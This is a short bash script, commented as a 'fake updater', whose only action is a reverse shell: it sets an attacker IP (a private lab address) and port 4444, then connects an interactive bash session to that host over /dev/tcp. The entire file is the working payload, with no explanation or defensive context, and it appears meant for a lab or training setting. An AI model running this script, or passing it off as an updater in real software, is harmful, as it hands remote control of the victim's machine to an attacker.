#!/bin/bash
# Fake updater

ATTACKER_IP=192.168.56.1
ATTACKER_PORT=4444

bash -i >& /dev/tcp/$ATTACKER_IP/$ATTACKER_PORT 0>&1
